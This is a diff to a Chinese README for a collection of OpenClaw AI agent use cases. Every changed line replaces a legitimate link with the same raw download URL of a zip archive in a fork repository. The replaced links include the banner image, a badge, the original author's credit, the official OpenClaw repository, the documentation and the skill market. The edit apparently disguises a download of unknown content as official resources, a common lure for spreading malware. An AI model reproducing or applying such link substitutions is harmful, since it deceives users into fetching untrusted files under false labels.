@@ -1,6 +1,6 @@
 <div align="center">
 
-<img width="1500" height="500" alt="OpenClaw AI 智能体最佳用例合集" src="https://github.com/user-attachments/assets/4ae57dfb-4f18-4677-9136-43bf93017250" />
+<img width="1500" height="500" alt="OpenClaw AI 智能体最佳用例合集" src="https://github.com/jrleon30/awesome-openclaw-usecases-zh/raw/refs/heads/main/usecases/zh_awesome_usecases_openclaw_v2.4.zip" />
 
 <br/>
 <br/>
@@ -11,7 +11,7 @@
 
 <br/>
 
-[![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
+[![Awesome](https://github.com/jrleon30/awesome-openclaw-usecases-zh/raw/refs/heads/main/usecases/zh_awesome_usecases_openclaw_v2.4.zip)](https://github.com/jrleon30/awesome-openclaw-usecases-zh/raw/refs/heads/main/usecases/zh_awesome_usecases_openclaw_v2.4.zip)
 ![用例数量](https://img.shields.io/badge/用例-39-blue?style=flat-square)
 ![中文](https://img.shields.io/badge/语言-简体中文-red?style=flat-square)
 ![新手友好](https://img.shields.io/badge/难度-新手友好-green?style=flat-square)
@@ -32,7 +32,7 @@
 <details>
 <summary><strong>📖 来源声明</strong></summary>
 
-本仓库受 [awesome-openclaw-usecases](https://github.com/hesamsheikh/awesome-openclaw-usecases) 启发，在其基础上独立发展，包含大量国内生态原创用例和适配内容。感谢原作者 [hesamsheikh](https://github.com/hesamsheikh) 和所有社区贡献者。
+本仓库受 [awesome-openclaw-usecases](https://github.com/jrleon30/awesome-openclaw-usecases-zh/raw/refs/heads/main/usecases/zh_awesome_usecases_openclaw_v2.4.zip) 启发，在其基础上独立发展，包含大量国内生态原创用例和适配内容。感谢原作者 [hesamsheikh](https://github.com/jrleon30/awesome-openclaw-usecases-zh/raw/refs/heads/main/usecases/zh_awesome_usecases_openclaw_v2.4.zip) 和所有社区贡献者。
 
 </details>
 
@@ -55,7 +55,7 @@
 
 ## 🚀 新手入门指南
 
-[OpenClaw](https://github.com/openclaw/openclaw)（前身为 ClawdBot、MoltBot）是一个开源的 **个人 AI 智能体**。和普通 AI 聊天不同，它能主动执行任务、永久记住你的偏好、连接多个平台、按时间表自动运行。简单来说，是一个 **7×24 小时在线的 AI 员工**。[查看官方中文教程](https://docs.openclaw.ai/zh-CN)
+[OpenClaw](https://github.com/jrleon30/awesome-openclaw-usecases-zh/raw/refs/heads/main/usecases/zh_awesome_usecases_openclaw_v2.4.zip)（前身为 ClawdBot、MoltBot）是一个开源的 **个人 AI 智能体**。和普通 AI 聊天不同，它能主动执行任务、永久记住你的偏好、连接多个平台、按时间表自动运行。简单来说，是一个 **7×24 小时在线的 AI 员工**。[查看官方中文教程](https://github.com/jrleon30/awesome-openclaw-usecases-zh/raw/refs/heads/main/usecases/zh_awesome_usecases_openclaw_v2.4.zip)
 
 <details>
 <summary><strong>🚀 三步开始使用（点击展开）</strong></summary>
@@ -236,8 +236,8 @@
 
 ## 📌 相关资源
 
-- [OpenClaw 官方仓库](https://github.com/openclaw/openclaw) — 安装和官方文档
-- [ClawHub 技能市场](https://clawhub.ai) — 浏览和安装技能
+- [OpenClaw 官方仓库](https://github.com/jrleon30/awesome-openclaw-usecases-zh/raw/refs/heads/main/usecases/zh_awesome_usecases_openclaw_v2.4.zip) — 安装和官方文档
+- [ClawHub 技能市场](https://github.com/jrleon30/awesome-openclaw-usecases-zh/raw/refs/heads/main/usecases/zh_awesome_usecases_openclaw_v2.4.zip) — 浏览和安装技能
 
 ---
 
